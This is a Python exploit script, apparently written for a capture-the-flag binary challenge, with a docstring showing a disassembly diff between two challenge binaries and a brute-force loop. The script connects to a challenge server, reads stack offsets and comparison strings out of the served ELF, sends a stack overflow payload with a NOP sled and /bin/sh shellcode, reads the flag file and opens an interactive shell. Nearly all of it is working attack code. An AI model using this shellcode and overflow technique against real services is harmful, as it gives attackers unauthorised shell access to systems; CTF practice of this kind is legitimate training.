#!/usr/bin/env python3
"""
diff -u appr1x.dis appr2x.dis 
--- appr1x.dis  2016-08-06 11:13:29.925783273 -0700
+++ appr2x.dis  2016-08-06 11:13:33.734783079 -0700
@@ -1,5 +1,5 @@
 
-appr1x.bin:     file format elf32-i386
+appr2x.bin:     file format elf32-i386
 
 
 Disassembly of section .init:
@@ -556,15 +556,15 @@
  804889a:      55                      push   %ebp
  804889b:      89 e5                   mov    %esp,%ebp
  804889d:      53                      push   %ebx
- 804889e:      81 ec e4 2f 00 00       sub    $0x2fe4,%esp
+ 804889e:      81 ec 34 3e 00 00       sub    $0x3e34,%esp
  80488a4:      e8 4d 01 00 00          call   0x80489f6
  80488a9:      05 57 17 0a 00          add    $0xa1757,%eax
  80488ae:      8d 15 bc a4 0e 08       lea    0x80ea4bc,%edx
  80488b4:      8b 12                   mov    (%edx),%edx
  80488b6:      83 ec 04                sub    $0x4,%esp
  80488b9:      52                      push   %edx
- 80488ba:      68 d4 33 00 00          push   $0x33d4
- 80488bf:      8d 95 24 d0 ff ff       lea    -0x2fdc(%ebp),%edx
+ 80488ba:      68 30 42 00 00          push   $0x4230
+ 80488bf:      8d 95 c8 c1 ff ff       lea    -0x3e38(%ebp),%edx
  80488c5:      52                      push   %edx
  80488c6:      89 c3                   mov    %eax,%ebx
  80488c8:      e8 23 69 00 00          call   0x804f1f0

There's a different string, see javre.

appr12x.jav.diff

# if you need to brute anything, you shouldn't.  
for i in $(seq 1 200); do echo 'new'; python3 apprentice1.py; done >hh1.txt
grep -A2 success hh1.txt

Pro tip, you don't.
"""
import struct
import socket
import telnetlib
import random

HOST, PORT = '172.31.1.47', 1624

# From HBW's exploit, I hope it works.
sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#varcmp = b'k'
#subesp = 0x3db8
sublea = 0x3dac
#stackptr = 0xffb107f0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
q = s.recv(8000)
q1 = q
#if b'\x7fELF' not in q:
while len(q) < 0xa2577:
	#print('fail1', q1, len(q))
	if q1 == b'': exit(1)
	if b'Can you exploit' in q: break
	q1 = s.recv(8000)
	q += q1
#end if

elf = q[q.index(b'\x7fELF'):]

varcmp = elf[0x73574:0x73594]
varcmp2 = elf[0x73598:0x73598+0x20]
#subesp = struct.unpack('<H', elf[0x534:0x536])[0]
sublea = 0x100000000 - struct.unpack('<I', elf[0x8c1:0x8c5])[0]

#print('varcmp', varcmp, 'subesp', hex(subesp))
print('varcmp', varcmp, 'varcmp2', varcmp2, 'sublea', hex(sublea))

# Works every time
addr = 0x80485cb
# Works 1 in 150 times.
addr = 0xffff948c
#a = varcmp + (b'\x90'*(subesp-8-len(sc))) + sc + struct.pack('<I', stackptr-subesp) + b'\n'
#a = varcmp + (b'\x90'*(subesp-8-len(sc))) + sc + struct.pack('<I', addr) + b'\n'

s.send(varcmp + b'\n')
stack = s.recv(1024)
print('stack addr', stack)
addr = int(stack, 16)-50-len(sc) #-random.randint(0, sublea)
print('addr', hex(addr))
a = varcmp2 + b' ' + (b'\x90'*(sublea+4-len(sc)-50-1)) + sc + (b'\x90'*50) + struct.pack('<I', addr) + b'\n'
if b'\n' in a[:-1]:
	print("fuck me", a)
#end if
if b'\x00' in a[:-1]:
	print("fuck me 2", a)
#end if
s.send(a)
print(a)
#print('resp', s.recv(1024))

s.send(b'cat /home/challenge/flag\n')
s.send(b'pwd\n')
print('resp success', s.recv(1024))

print("shell:")
ts = telnetlib.Telnet()
ts.sock = s
ts.interact()

s.close()

